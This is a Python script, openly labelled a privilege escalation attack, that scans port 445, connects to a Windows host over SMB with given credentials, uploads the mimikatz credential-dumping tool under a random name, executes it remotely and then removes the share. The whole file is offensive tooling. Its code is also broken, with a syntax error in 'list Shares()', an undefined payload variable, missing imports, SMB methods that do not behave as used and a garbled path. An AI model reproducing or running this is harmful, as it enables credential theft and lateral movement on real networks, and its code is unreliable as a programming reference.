# define a class to perform privilege escalation attack in windows through mimikatz
class PrivEscWin:
	def __init__(self, ip, user, password, domain, port=445):
		self.ip = ip
		self.user = user
		self.password = password
		self.domain = domain
		self.port = port

	# function to perform privilege escalation attack
	def priv_esc(self):
		# check the status of the port 445
		scanner = nmap.PortScanner()
		scanner.scan(self.ip, str(self.port))
		print(scanner.scaninfo())
		print(scanner[self.ip].state())

		# connect to the server using samba tools
		try:
			conn = SMBConnection(self.user, self.password, '', self.domain, use_ntlm_v2 = True)
			assert conn.connect(self.ip, self.port)
			shares = conn.list Shares()
			for share in shares:
				print("Found share {}".format(share.name))
		except SMBException:
			print("Unable to connect")
			sys.exit(0)
		# create a share to upload mimikatz
		name = ''.join(random.choices(string.ascii_lowercase, k=10))
		print("Created share {}".format(name))
		try:
			conn.createDirectory(name)
		except SMBException:
			print("Error: Unable to create share {}".format(name))
			sys.exit(0)
		# upload mimikatz
		filename = ''.join(random.choices(string.ascii_letters, k=10))
		print("Created file {}".format(filename))
		file_path = os.path.join(os.getcwd(), 'mimikatz', filename)
		with open(file_path, 'wb') as fout:
			fout.write(mimikatz)
		conn.storeFile(name, filename, open(file_path, 'rb'))
		# start mimikatz
		os_command = 'cmd /c {}'.format(os.path.join("\\","\\","\\","\\",name, filename))
		print("Executing command {}".format(os_command))
		conn.createProcess(name, os_command)
		# delete the share
		try:
			conn.deleteDirectory(name)
		except SMBException:
			print("Error: Unable to delete share {}".format(name))
			sys.exit(0)
		# close the connection
		conn.close()

# function to parse the command line arguments
def parse_args():
	parser = argparse.ArgumentParser()
	parser.add_argument("-i", "--ip", dest = "ip", help = "IP address of the remote host", required = True)
	parser.add_argument("-u", "--user", dest = "user", help = "username for the connection", required = True)
	parser.add_argument("-p", "--password", dest = "password", help = "password for the connection", required = True)
	parser.add_argument("-d", "--domain", dest = "domain", help = "domain name of the remote host", required = True)
	parser.add_argument("-po", "--port", dest = "port", type = int, help = "port number of the remote host")
	args = parser.parse_args()
	return args

# main function
def main():
	args = parse_args()
	# create an object of PrivEscWin class
	pe = PrivEscWin(args.ip, args.user, args.password, args.domain, args.port)
	# perform privilege escalation attack
	pe.priv_esc()

# call the main function
if __name__ == "__main__":
	main()